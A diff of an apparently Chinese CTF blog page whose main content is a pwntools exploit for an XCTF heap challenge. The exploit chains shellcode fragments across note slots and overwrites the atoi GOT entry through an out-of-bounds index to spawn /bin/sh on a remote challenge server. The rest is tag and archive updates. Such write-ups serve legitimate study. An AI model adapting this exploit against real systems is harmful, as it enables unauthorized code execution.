@@ -285,6 +285,8 @@ height:50vh;
     
         <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags="堆相关题目">堆相关题目</a>
+    
 </div>
                 
                 
@@ -510,7 +512,7 @@ execve的原型是：<code>int execve(const char *filename, char *const argv[],c
 </ol>
 </blockquote>
 <h3 id="font-color-navy0x02-完整expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-完整expfont"></a> <font color="navy"><code>0x02 完整exp</code></font></h3>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">40709</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addNote</span><span class="params">(r, index, size, content)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"index:"</span>,index)</span><br><span class="line">	r.sendlineafter(<span class="string">"size:"</span>,size)</span><br><span class="line">	r.sendafter(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(r, index)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"index"</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addNote(r,<span class="string">"0"</span>,<span class="string">"8"</span>,<span class="string">"a"</span>*<span class="number">7</span>)</span><br><span class="line">addNote(r,<span class="string">"1"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rsi,rsi'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"2"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rdx,rdx'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"3"</span>,<span class="string">"8"</span>,str(asm(<span class="string">'syscall'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">7</span>,<span class="string">'\x90'</span>))</span><br><span class="line">addNote(r,<span class="string">"4"</span>,<span class="string">"8"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">delete(r,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#addNote(r,str((elf.got["free"]-0x2020A0)//8),"8",asm('xor rax,rax',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')</span></span><br><span class="line"><span class="comment">#addNote(r,"2","8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')</span></span><br><span class="line">addNote(r,str((elf.got[<span class="string">"atoi"</span>]<span class="number">-0x2020A0</span>)//<span class="number">8</span>),<span class="string">"8"</span>,asm(<span class="string">'mov eax,0x3B'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\xeb\x19'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>,<span class="string">'/bin/sh'</span>)  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">40709</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addNote</span><span class="params">(r, index, size, content)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"index:"</span>,index)</span><br><span class="line">	r.sendlineafter(<span class="string">"size:"</span>,size)</span><br><span class="line">	r.sendafter(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(r, index)</span>:</span></span><br><span class="line">	r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">"index"</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addNote(r,<span class="string">"0"</span>,<span class="string">"8"</span>,<span class="string">"a"</span>*<span class="number">7</span>)</span><br><span class="line">addNote(r,<span class="string">"1"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rsi,rsi'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"2"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rdx,rdx'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"3"</span>,<span class="string">"8"</span>,str(asm(<span class="string">'syscall'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">7</span>,<span class="string">'\x90'</span>))</span><br><span class="line">addNote(r,<span class="string">"4"</span>,<span class="string">"8"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">deleteNote(r,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#addNote(r,str((elf.got["free"]-0x2020A0)//8),"8",asm('xor rax,rax',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')</span></span><br><span class="line"><span class="comment">#addNote(r,"2","8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')</span></span><br><span class="line">addNote(r,str((elf.got[<span class="string">"atoi"</span>]<span class="number">-0x2020A0</span>)//<span class="number">8</span>),<span class="string">"8"</span>,asm(<span class="string">'mov eax,0x3B'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\xeb\x19'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>,<span class="string">'/bin/sh'</span>)  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -519,13 +521,18 @@ execve的原型是：<code>int execve(const char *filename, char *const argv[],c
             <p>原文作者：<a href="https://muzibing.github.io">MUZIBing</a>
             </p><p>原文链接：<a href="https://muzibing.github.io/2020/07/18/2020.07.18（137）/">https://muzibing.github.io/2020/07/18/2020.07.18（137）/</a>
             </p><p>发表日期：<a href="https://muzibing.github.io/2020/07/18/2020.07.18（137）/">July 18th 2020, 12:00:00 am</a>
-            </p><p>更新日期：<a href="https://muzibing.github.io/2020/07/18/2020.07.18（137）/">July 19th 2020, 12:02:26 am</a>
+            </p><p>更新日期：<a href="https://muzibing.github.io/2020/07/18/2020.07.18（137）/">July 19th 2020, 10:55:37 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
     <!-- paginator  -->
     <ul class="post-paginator">
         <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2020/07/19/2020.07.19（138）/" title="【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）">
+                    <div class="nextTitle">【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）</div>
+                </a>
             
         </li>
         <li class="previous">
@@ -3144,9 +3151,92 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 137
+        Total : 138
         </div>
         <!-- search  -->
         
@@ -3163,6 +3253,11 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href="/2020/07/19/2020.07.19（138）/">【XCTF-Pwn:Mary_Morto】非常简单的热身pwn（ps：我还真信了）</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -3286,12 +3381,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（113）/">Hexo博客完善（持续更新）</a>
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.29（112）/">pwntools的简单总结（持续更新）</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.29（112）/">pwntools的简单总结（持续更新）</a>
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href="/2020/04/30/2020.04.30（113）/">Hexo博客完善（持续更新）</a>
         </li>
     
     
@@ -3381,12 +3476,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（93）/">【转载】文件 HOSTS 的简介和修改方法</a>
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（94）/">【转载】 XSS 简单总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（94）/">【转载】 XSS 简单总结</a>
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2020/02/23/2020.02.23（93）/">【转载】文件 HOSTS 的简介和修改方法</a>
         </li>
     
     
@@ -3944,6 +4039,10 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="C"><span class="iconfont-archer">&#xe606;</span>C</span>
     
         <span class="sidebar-tag-name" data-tags="看雪CTF"><span class="iconfont-archer">&#xe606;</span>看雪CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="栈相关题目"><span class="iconfont-archer">&#xe606;</span>栈相关题目</span>
+    
+        <span class="sidebar-tag-name" data-tags="堆相关题目"><span class="iconfont-archer">&#xe606;</span>堆相关题目</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
